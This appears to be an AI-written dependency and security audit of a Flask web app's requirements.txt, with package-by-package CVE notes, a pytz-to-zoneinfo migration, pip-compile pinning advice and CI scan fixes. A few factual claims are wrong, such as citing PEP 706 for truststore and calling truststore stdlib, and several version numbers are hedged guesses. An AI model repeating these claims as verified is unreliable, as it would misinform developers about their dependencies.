| Known CVEs | CVE-2024-6221 (CORS bypass via extra newline character, fixed in 5.0.0). 6.0.0 is post-fix. |
| Alternatives | Manual CORS headers (not recommended), Quart-CORS (only for async) |
| Confidence | MEDIUM -- 6.x is relatively new, may have patch releases |

**Recommendation:** Keep. Pin `>=6.0.0,<7.0`. The 6.0 rewrite changed the configuration API; if upgrading from 4.x, config migration is needed (already done in this project).

### 3. Flask-Limiter

| Property | Value |
|----------|-------|
| Current pin | `>=3.8.0` |
| Latest known | 3.8.0 (released 2024) |
| Actively maintained | YES -- alisaifee/flask-limiter |
| Known CVEs | None known at 3.x |
| Alternatives | Custom middleware, slowapi (for FastAPI only) |
| Confidence | MEDIUM |

**Recommendation:** Keep. Pin `>=3.8.0,<4.0`. Note: the project uses in-memory storage (`storage_uri="memory://"`), which resets on container restart and does not share across Cloud Run instances. This is a known limitation documented in CONCERNS.md (L-02).

### 4. Flask-Compress

| Property | Value |
|----------|-------|
| Current pin | `>=1.17` |
| Latest known | 1.17 (released 2024) |
| Actively maintained | YES (low activity -- mature, stable) |
| Known CVEs | None known |
| Alternatives | Nginx/reverse proxy gzip (Cloud Run handles this), brotli via `flask-compress[brotli]` |
| Confidence | MEDIUM |

**Recommendation:** Keep. Pin `>=1.17,<2.0`. Note: Cloud Run's load balancer can handle compression at the edge, making this potentially redundant. However, it is harmless and adds compression for direct-access scenarios.

### 5. Requests

| Property | Value |
|----------|-------|
| Current pin | `>=2.32.4` |
| Latest known | 2.32.3 (released mid-2024) -- the pin `>=2.32.4` may reference a patch I do not have data for |
| Actively maintained | YES -- PSF/requests, one of the most-downloaded Python packages |
| Known CVEs | CVE-2024-35195 (session cert verification bypass, fixed in 2.32.0). CVE-2023-32681 (header leak on redirect, fixed in 2.31.0). Both pre-date current pin. |
| Alternatives | `httpx` (modern, async-capable, HTTP/2), `urllib3` directly |
| Confidence | MEDIUM |

**Recommendation:** Keep. Pin `>=2.32.4,<3.0`. The project uses `requests` only for simple synchronous scraping of a single URL (`app.py:200-215`). No need for `httpx` unless async scraping is desired.

### 6. BeautifulSoup4

| Property | Value |
|----------|-------|
| Current pin | `>=4.12.3` |
| Latest known | 4.12.3 (released 2024) |
| Actively maintained | YES -- Leonard Richardson, long-lived project |
| Known CVEs | None known at 4.12.x. Historical issues were in parsers (lxml, html.parser), not BS4 itself. |
| Alternatives | See dedicated section below |
| Confidence | MEDIUM |

**Recommendation:** Keep for this use case. Pin `>=4.12.3,<5.0`. See detailed analysis in "BeautifulSoup4 vs Alternatives" section below.

### 7. Gunicorn

| Property | Value |
|----------|-------|
| Current pin | `>=23.0.0` |
| Latest known | 23.0.0 (released 2024, major version bump with Python 3.12 support improvements) |
| Actively maintained | YES -- benoitc/gunicorn |
| Known CVEs | CVE-2024-1135 (HTTP request smuggling via Transfer-Encoding, fixed in 22.0.0). 23.x is post-fix. |
| Alternatives | `uvicorn` (ASGI only), `waitress` (Windows-compatible), `granian` (Rust-based) |
| Confidence | MEDIUM |

**Recommendation:** Keep. Pin `>=23.0.0,<24.0`. Gunicorn is the standard WSGI server for Flask on Cloud Run.

### 8. pytz

| Property | Value |
|----------|-------|
| Current pin | `>=2024.2` |
| Latest known | 2024.2 (released late 2024) |
| Actively maintained | YES -- but author has publicly recommended migration to `zoneinfo` for new code |
| Known CVEs | None known (data package, not code-heavy) |
| Alternatives | `zoneinfo` (stdlib since Python 3.9) -- see dedicated section below |
| Confidence | HIGH (strong recommendation based on Python ecosystem consensus) |

**Recommendation:** **REPLACE with `zoneinfo`**. See dedicated section below.

### 9. google-cloud-firestore

| Property | Value |
|----------|-------|
| Current pin | `>=2.19.0` |
| Latest known | 2.19.x (early 2025 -- Google Cloud SDK follows frequent release cadence) |
| Actively maintained | YES -- Google Cloud official SDK, very active |
| Known CVEs | None known in the Firestore client itself. Transitive dependencies (grpc, protobuf) have had historical CVEs but are kept current by Google. |
| Alternatives | Firebase Admin SDK (wraps Firestore), direct REST API (not recommended) |
| Confidence | LOW -- Google Cloud SDKs release frequently; 2.19.0 is likely outdated by several minor versions |

**Recommendation:** Keep. Pin `>=2.19.0,<3.0`. Run `pip index versions google-cloud-firestore` to find the actual latest. The Google Cloud Firestore SDK follows semantic versioning within 2.x.

### 10. bcrypt

| Property | Value |
|----------|-------|
| Current pin | `>=4.2.0` |
| Latest known | 4.2.1 (released early 2025) |
| Actively maintained | YES -- pyca/bcrypt, maintained by the PyCA team (same team as `cryptography`) |
| Known CVEs | None known at 4.x. The package is a thin wrapper around a C/Rust bcrypt implementation. |
| Alternatives | `argon2-cffi` (Argon2 is considered stronger than bcrypt for new systems), `passlib` (wrapper supporting multiple algorithms) |
| Confidence | MEDIUM |

**Recommendation:** Keep bcrypt. Pin `>=4.2.0,<5.0`. Bcrypt is well-understood and sufficient. Argon2 is theoretically superior (memory-hard, won PHC), but bcrypt is battle-tested and the migration cost is not justified for this project.

### 11. urllib3

| Property | Value |
|----------|-------|
| Current pin | `>=2.5.0` |
| Latest known | 2.3.7 or later (the pin `>=2.5.0` may be speculative or from a newer release) |
| Actively maintained | YES -- urllib3/urllib3, critical Python infrastructure |
| Known CVEs | CVE-2024-37891 (proxy auth header leak, fixed in 2.2.2). Pre-dates current pin. |
| Alternatives | None -- this is a transitive dependency of `requests` |
| Confidence | LOW -- the `>=2.5.0` pin suggests a version beyond my training data |

**NOTE:** This is a transitive dependency of `requests`. The pinned minimum `>=2.5.0` is a security-motivated override to force a safe version floor. Verify this version exists: `pip index versions urllib3`.

**Recommendation:** Keep the security floor pin. Update to match whatever `requests` pulls. Pin `>=2.5.0,<3.0`.

### 12. protobuf

| Property | Value |
|----------|-------|
| Current pin | `>=5.29.0` |
| Latest known | 5.29.x (released late 2024 / early 2025) |
| Actively maintained | YES -- Google-maintained (protocolbuffers/protobuf) |
| Known CVEs | CVE-2024-7254 (stack overflow in nested message parsing, fixed in 5.28.0). Pre-dates current pin. |
| Alternatives | None -- transitive dependency of `google-cloud-firestore` and `grpcio` |
| Confidence | MEDIUM |

**Recommendation:** Keep the security floor pin. Pin `>=5.29.0,<6.0`. This is a transitive dependency of the Google Cloud SDK.

### 13. Werkzeug

| Property | Value |
|----------|-------|
| Current pin | `>=3.1.3` |
| Latest known | 3.1.3 (released late 2024) |
| Actively maintained | YES -- Pallets project (same team as Flask) |
| Known CVEs | CVE-2024-34069 (debugger RCE when debug mode enabled, fixed in 3.0.3). Pre-dates current pin. Historical: CVE-2023-25577 (multipart parser DoS, fixed in 2.3.8). |
| Alternatives | None -- this is Flask's core WSGI toolkit dependency |
| Confidence | MEDIUM |

**Recommendation:** Keep the security floor pin. Pin `>=3.1.3,<4.0`. This is a transitive dependency of Flask.

### 14. zipp

| Property | Value |
|----------|-------|
| Current pin | `>=3.21.0` |
| Latest known | 3.21.0 (released late 2024) |
| Actively maintained | YES -- jaraco/zipp |
| Known CVEs | CVE-2024-5569 (DoS via crafted zip file, fixed in 3.19.1). Pre-dates current pin. |
| Alternatives | None -- transitive dependency of `importlib-metadata` |
| Confidence | MEDIUM |

**Recommendation:** Keep the security floor pin. Pin `>=3.21.0,<4.0`.

### 15. certifi

| Property | Value |
|----------|-------|
| Current pin | `>=2024.12.14` |
| Latest known | 2024.12.14 (CA certificate bundle, released Dec 2024) |
| Actively maintained | YES -- certifi/python-certifi |
| Known CVEs | CVE-2024-39689 (removal of compromised e-Tugra CA, fixed in 2024.7.4). Pre-dates current pin. |
| Alternatives | System CA store via `truststore` (PEP 706, Python 3.10+) |
| Confidence | MEDIUM |

**Recommendation:** Keep. The pin ensures the latest CA bundle. Certifi releases new versions whenever Mozilla's CA bundle updates. Update this pin periodically (every 3-6 months). Pin as `>=2024.12.14` (no upper bound needed -- CA bundles are always backward-compatible).

---

## Version Summary Table

| Package | Current Pin | Known Latest (as of May 2025) | Status | Action Needed |
|---------|------------|-------------------------------|--------|---------------|
| flask | `>=3.1.0` | 3.1.0 | Active, no CVEs | Add upper bound `<4.0` |
| flask-cors | `>=6.0.0` | 6.0.0 | Active, CVE fixed pre-6.0 | Add upper bound `<7.0` |
| flask-limiter | `>=3.8.0` | 3.8.0 | Active, no CVEs | Add upper bound `<4.0` |
| flask-compress | `>=1.17` | 1.17 | Stable, no CVEs | Add upper bound `<2.0` |
| requests | `>=2.32.4` | 2.32.3+ | Active, CVEs fixed pre-pin | Add upper bound `<3.0` |
| beautifulsoup4 | `>=4.12.3` | 4.12.3 | Active, no CVEs | Add upper bound `<5.0` |
| gunicorn | `>=23.0.0` | 23.0.0 | Active, CVE fixed pre-pin | Add upper bound `<24.0` |
| pytz | `>=2024.2` | 2024.2 | **DEPRECATED in favor of zoneinfo** | **Replace with zoneinfo** |
| google-cloud-firestore | `>=2.19.0` | ~2.19.x (likely newer) | Active, frequent releases | Add upper bound `<3.0`, verify latest |
| bcrypt | `>=4.2.0` | 4.2.1 | Active, no CVEs | Add upper bound `<5.0` |
| urllib3 | `>=2.5.0` | 2.3.7+ (verify pin) | Active, CVE fixed pre-pin | Verify `2.5.0` exists, add `<3.0` |
| protobuf | `>=5.29.0` | 5.29.x | Active, CVE fixed pre-pin | Add upper bound `<6.0` |
| werkzeug | `>=3.1.3` | 3.1.3 | Active, CVEs fixed pre-pin | Add upper bound `<4.0` |
| zipp | `>=3.21.0` | 3.21.0 | Active, CVE fixed pre-pin | Add upper bound `<4.0` |
| certifi | `>=2024.12.14` | 2024.12.14 | Active, CVE fixed pre-pin | Keep open-ended (CA bundles always compatible) |

---

## Deep Dive: pytz vs zoneinfo

### Current Usage

`pytz` is used **29 times** across `database.py` (27 occurrences) and `app.py` (2 occurrences). Every single usage follows the exact same pattern:

```python
tz = pytz.timezone('Europe/Warsaw')
now = datetime.now(tz)
```

This is a trivially replaceable pattern.

### Why Replace pytz

1. **pytz is effectively deprecated.** The author (Stuart Bishop) has stated that `zoneinfo` (PEP 615, stdlib since Python 3.9) is the replacement. The pytz documentation itself recommends zoneinfo for new code.

2. **pytz has a subtle API trap.** The "correct" pytz way to localize a datetime is `tz.localize(naive_dt)`, NOT `datetime(..., tzinfo=tz)`. The latter silently produces wrong results for timezones with historical offset changes. The gym-tracker code uses `datetime.now(tz)` which IS safe with pytz, but the trap exists for any future developer.

3. **zoneinfo has no such trap.** `datetime.now(ZoneInfo('Europe/Warsaw'))` works correctly, and `datetime(..., tzinfo=ZoneInfo('Europe/Warsaw'))` also works correctly.

4. **One less dependency.** The project runs Python 3.12 in production. `zoneinfo` is stdlib -- zero install needed.

5. **Performance.** `zoneinfo` uses the OS timezone database directly (or `tzdata` package as fallback on Windows). It is slightly faster than pytz for repeated lookups.

### Migration Pattern

**Before (pytz):**
```python
import pytz

tz = pytz.timezone('Europe/Warsaw')
now = datetime.now(tz)
```

**After (zoneinfo):**
```python
from zoneinfo import ZoneInfo

tz = ZoneInfo('Europe/Warsaw')
now = datetime.now(tz)
```

The replacement is a mechanical find-and-replace:
- `import pytz` -> `from zoneinfo import ZoneInfo`
- `pytz.timezone('Europe/Warsaw')` -> `ZoneInfo('Europe/Warsaw')`

**Windows consideration:** On Windows (dev environment), `zoneinfo` requires the `tzdata` package if the OS timezone database is not available. Alpine Linux (production Docker) ships with the system tzdata. Add `tzdata` as a conditional dependency or unconditionally for safety:

```
tzdata>=2024.2;python_version>="3.9"
```

Or simply add `tzdata>=2024.2` unconditionally (it is a no-op on systems with system tzdata).

### Recommendation

**REPLACE pytz with zoneinfo.** Confidence: HIGH.

- Remove `pytz>=2024.2` from `requirements.txt`
- Add `tzdata>=2024.2` to `requirements.txt` (for Windows dev compatibility)
- Update 29 call sites (mechanical replacement)
- Test with `python3 -c "from zoneinfo import ZoneInfo; print(ZoneInfo('Europe/Warsaw'))"`

---

## Deep Dive: BeautifulSoup4 vs Alternatives

### Current Usage

BeautifulSoup4 is used in exactly ONE place (`app.py:215-227`):

```python
soup = BeautifulSoup(response.text, 'html.parser')
page_text = soup.get_text()
# ... then regex on page_text
numbers = re.findall(r'(\d+)\s*/\s*(\d+)', page_text)
```

The usage is minimal: parse HTML, extract all text, then regex for numbers. The HTML parser used is Python's built-in `html.parser` (not lxml).

### Alternatives Comparison

| Library | Speed | Install Size | API Style | Best For |
|---------|-------|-------------|-----------|----------|
| **beautifulsoup4** | Moderate | ~500KB | Pythonic, forgiving | General scraping, broken HTML |
| **lxml** | Fast (C-based) | ~10MB | XPath/CSS selectors | Performance-critical, large documents |
| **selectolax** | Very fast (C-based) | ~2MB | Minimal API | Speed-critical, simple extraction |
| **parsel** | Fast (lxml-based) | ~3MB | Scrapy-style selectors | Scrapy ecosystem users |
| **html.parser** (stdlib) | Slow | 0 | SAX-style | Zero-dependency needs |

### Recommendation for This Project

**KEEP beautifulsoup4.** Confidence: HIGH.

Reasons:
1. **Minimal usage.** BS4 is used in one function to parse one page. Performance is irrelevant.
2. **`html.parser` backend.** The project already uses the stdlib parser, so lxml is not needed.
3. **The actual parsing is trivial.** The code just calls `.get_text()` and then uses regex. Any library would work.
4. **Switching adds risk, no value.** BS4 is well-tested, widely understood, and the current code works.

If the project were to expand scraping (e.g., parsing complex HTML tables), lxml or selectolax would be worth considering. For a single `.get_text()` call, BS4 is perfectly appropriate.

**Alternative worth noting:** The scraping could technically be done without BS4 using just `html.parser` from stdlib:

```python
from html.parser import HTMLParser

class TextExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.text = []
    def handle_data(self, data):
        self.text.append(data)
    def get_text(self):
        return ' '.join(self.text)
```

But this is more code, harder to maintain, and saves only one dependency. Not recommended.

---

## Deep Dive: Version Pinning Strategy

### Current State

All 15 dependencies use `>=` with no upper bound. This is documented in CONCERNS.md as finding L-04.

### Option 1: Bounded Ranges (Recommended for requirements.txt)

```
flask>=3.1.0,<4.0
flask-cors>=6.0.0,<7.0
flask-limiter>=3.8.0,<4.0
flask-compress>=1.17,<2.0
requests>=2.32.4,<3.0
beautifulsoup4>=4.12.3,<5.0
gunicorn>=23.0.0,<24.0
google-cloud-firestore>=2.19.0,<3.0
bcrypt>=4.2.0,<5.0
urllib3>=2.5.0,<3.0
protobuf>=5.29.0,<6.0
werkzeug>=3.1.3,<4.0
zipp>=3.21.0,<4.0
certifi>=2024.12.14
tzdata>=2024.2
```

**Pros:** Prevents accidental major version upgrades. Still allows patch/minor updates.
**Cons:** Does not guarantee reproducible builds (different installs at different times get different minor versions).

### Option 2: Exact Pins (requirements.txt as lockfile)

```
flask==3.1.0
flask-cors==6.0.0
...
```

**Pros:** Perfectly reproducible.
**Cons:** No automated security patches. Every update is manual. Transitive dependencies not pinned.

### Option 3: Lockfile (Recommended)

Use `requirements.txt` with bounded ranges as the "intent" file, plus a lockfile for reproducibility.

**Tools compared:**

| Tool | Lockfile | Format | Speed | Ecosystem Fit |
|------|----------|--------|-------|---------------|
| **pip-compile** (pip-tools) | `requirements.lock` | pip-compatible | Moderate | Best for pip-only projects |
| **poetry** | `poetry.lock` | TOML | Moderate | Best for library projects, overkill here |
| **uv** | `uv.lock` | TOML | Very fast | Modern, Rust-based, gaining adoption rapidly |
| **pdm** | `pdm.lock` | TOML | Fast | PEP 621 native |

### Recommendation

**Use pip-compile (pip-tools) with bounded ranges.** Confidence: HIGH.

Rationale:
- The project already uses `pip` and `requirements.txt`. Minimal change.
- pip-tools is the lowest-friction lockfile solution for existing pip workflows.
- `uv` is excellent but may add complexity for a project with one developer.

**Workflow:**

1. Rename current `requirements.txt` to `requirements.in` (the "intent" file with bounded ranges).
2. Install pip-tools: `pip install pip-tools`
3. Generate lockfile: `pip-compile requirements.in -o requirements.txt`
4. In Dockerfile: `pip install -r requirements.txt` (uses the locked file, unchanged command)
5. To update: `pip-compile --upgrade requirements.in -o requirements.txt`

**Alternative:** If the team is comfortable with `uv`, it is faster and more modern:
```bash
uv pip compile requirements.in -o requirements.txt
```

`uv` is a drop-in replacement for pip-compile with 10-100x speed improvements and better dependency resolution.

---

## CI/CD Security Scan Issues

The project's security scan workflow (`.github/workflows/security-scan.yml`) has two issues:

### Issue 1: `continue-on-error: true` on Both Audit Steps

```yaml
- name: Audit Python Dependencies (Safety)
  continue-on-error: true    # <-- Vulnerable builds pass CI
  run: safety check --full-report

- name: Audit Python Dependencies (pip-audit)
  continue-on-error: true    # <-- Vulnerable builds pass CI
  run: pip-audit --strict
```

Both vulnerability scanners are set to continue-on-error, meaning a known CVE in a dependency will NOT fail the build. This makes the entire security scan informational-only.

**Recommendation:** Remove `continue-on-error: true` from at least one scanner (preferably `pip-audit`, which is more reliable). This will block deploys with known vulnerabilities.

### Issue 2: Python Version Mismatch

The CI workflow uses `python-version: '3.11'` but the Dockerfile uses `python:3.12-alpine`. Dependencies may resolve differently between Python versions. Use `python-version: '3.12'` in CI to match production.

### Issue 3: No Dependabot / Renovate

There is no automated dependency update mechanism. GitHub Dependabot or Renovate would automatically create PRs when new versions (especially security fixes) are released.

**Recommendation:** Add `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5
```

---

## Transitive Dependency Audit

The `requirements.txt` pins 5 transitive dependencies for security reasons:
- `urllib3` (pulled by `requests`)
- `protobuf` (pulled by `google-cloud-firestore` via `grpcio`)
- `werkzeug` (pulled by `flask`)
- `zipp` (pulled by `importlib-metadata`)
- `certifi` (pulled by `requests`)

This is a good practice -- it ensures security floors for critical transitive dependencies. However, it has a maintenance cost: these pins must be updated when the parent packages update their requirements.

**With a lockfile (pip-compile), this becomes unnecessary.** The lockfile captures all transitive dependency versions automatically. The security floor can be enforced via `pip-audit` in CI instead of manual pins.

**Recommendation after lockfile adoption:** Remove the 5 transitive dependency pins from `requirements.in`. Let `pip-compile` resolve them. Rely on `pip-audit` (with `continue-on-error: false`) to catch CVEs.

---

## Recommended requirements.in (After Changes)

```
# Core framework
flask>=3.1.0,<4.0
flask-cors>=6.0.0,<7.0
flask-limiter>=3.8.0,<4.0
flask-compress>=1.17,<2.0

# HTTP/Scraping
requests>=2.32.4,<3.0
beautifulsoup4>=4.12.3,<5.0

# Server
gunicorn>=23.0.0,<24.0

# Database
google-cloud-firestore>=2.19.0,<3.0

# Authentication
bcrypt>=4.2.0,<5.0

# Timezone (stdlib zoneinfo + tzdata for Windows)
tzdata>=2024.2

# NOTE: urllib3, protobuf, werkzeug, zipp, certifi are transitive dependencies.
# Their versions are locked by pip-compile in requirements.txt.
# Security floors enforced by pip-audit in CI (continue-on-error: false).
```

Changes from current:
1. **Removed:** `pytz` (replaced by stdlib `zoneinfo`)
2. **Added:** `tzdata` (Windows compatibility for `zoneinfo`)
3. **Removed:** 5 transitive dependency pins (handled by lockfile + CI audit)
4. **Added:** Upper-bound version constraints on all packages
5. **Added:** Comments explaining the structure

---

## Action Items (Priority Order)

### P0: Immediate (Security)

1. **Fix CI security scan:** Remove `continue-on-error: true` from `pip-audit` step in `.github/workflows/security-scan.yml`. Fix Python version to `3.12` to match production.

2. **Verify version pins exist on PyPI:** Run `pip index versions urllib3` and confirm `2.5.0` exists. If not, adjust the pin downward to the latest available version.

### P1: Short-term (Reliability)

3. **Add version upper bounds:** Change all `>=X.Y.Z` to `>=X.Y.Z,<NEXT_MAJOR` in `requirements.txt`.

4. **Adopt pip-compile lockfile:**
   - `pip install pip-tools`
   - Rename `requirements.txt` to `requirements.in`
   - `pip-compile requirements.in -o requirements.txt`
   - Commit both files
   - Update Dockerfile (no change needed -- still `pip install -r requirements.txt`)

### P2: Medium-term (Modernization)

5. **Replace pytz with zoneinfo:** Mechanical find-and-replace across 29 call sites. Add `tzdata` to requirements.

6. **Add Dependabot:** Create `.github/dependabot.yml` for automated dependency update PRs.

### P3: Optional (Nice-to-have)

7. **Consider `uv` over pip-tools:** If developer experience matters, `uv` is significantly faster. It is also a single binary with no Python dependency.

8. **Consider `truststore` for CA certs:** PEP 706 allows using the OS certificate store instead of bundled `certifi`. This keeps CA certs always current. Only works on Python 3.10+. Not urgent.

---

## Common Pitfalls

### Pitfall 1: Alpine + Binary Wheels
**What goes wrong:** Some packages (bcrypt, grpcio, google-cloud-firestore) include C extensions. On Alpine Linux, precompiled wheels may not be available, requiring compilation from source (which needs build tools like `gcc`, `musl-dev`).
**Current state:** The Dockerfile uses `python:3.12-alpine` and does `pip install --no-cache-dir -r requirements.txt`. If compilation is needed, it will fail silently or produce slower builds.
**How to detect:** If `docker build` takes >5 minutes, binary compilation is likely happening.
**Recommendation:** Monitor build times. If slow, consider `python:3.12-slim` (Debian-based, better wheel availability) or use `--only-binary :all:` flag to fail fast if wheels are missing.

### Pitfall 2: pytz Localization Trap
**What goes wrong:** Using `datetime(2026, 1, 1, tzinfo=pytz.timezone('Europe/Warsaw'))` produces WRONG results because pytz timezones are not compatible with the `datetime` constructor's `tzinfo` parameter (they return LMT offset instead of current offset).
**Current state:** The project uses `datetime.now(tz)` which is safe. But any future code that constructs datetimes manually would hit this bug silently.
**How to avoid:** Migrate to `zoneinfo` where this is not a problem.

### Pitfall 3: pip-compile Doesn't Run Automatically
**What goes wrong:** Developer adds a dependency to `requirements.in` but forgets to run `pip-compile`. The lockfile (`requirements.txt`) is stale. Dockerfile installs old versions.
**How to avoid:** Add a pre-commit hook:
```yaml
# .pre-commit-config.yaml
- repo: https://github.com/jazzband/pip-tools
  rev: 7.4.1
  hooks:
    - id: pip-compile
      files: requirements.in
```

---

## Confidence Assessment

| Area | Level | Reason |
|------|-------|--------|
| Version numbers | LOW | Based on training data (May 2025 cutoff). Up to 11 months of releases are unverified. |
| CVE history | MEDIUM | Known CVEs are well-documented, but new CVEs since May 2025 are unknown. |
| pytz -> zoneinfo | HIGH | This is a well-established Python ecosystem consensus, independent of version numbers. |
| Pinning strategy | HIGH | pip-compile/lockfile is standard practice, independent of specific versions. |
| BS4 recommendation | HIGH | Usage analysis is based on code review of the actual codebase. |
| CI security scan fix | HIGH | Based on direct reading of the workflow YAML. |

**Research date:** 2026-04-04
**Valid until:** Verify version numbers immediately before acting. Recommendations (pytz replacement, pinning strategy, CI fix) are valid indefinitely.

---

## Sources

### Primary (HIGH confidence)
- Project source code: `requirements.txt`, `app.py`, `database.py`, `Dockerfile`, `.github/workflows/security-scan.yml`
- Project audit documents: `.planning/codebase/STACK.md`, `.planning/codebase/CONCERNS.md`, `AUDIT/03_SECURITY_AUDIT.md`
- Python PEP 615 (zoneinfo) -- stdlib documentation
- Python PEP 706 (truststore) -- stdlib documentation

### Secondary (MEDIUM confidence)
- Training data knowledge of PyPI package versions and CVE databases (cutoff: May 2025)
- pip-tools, uv documentation from training data

### Tertiary (LOW confidence)
- Exact latest version numbers for packages that may have released updates between June 2025 and April 2026
- The existence of `urllib3>=2.5.0` on PyPI (may be speculative pin from project author)
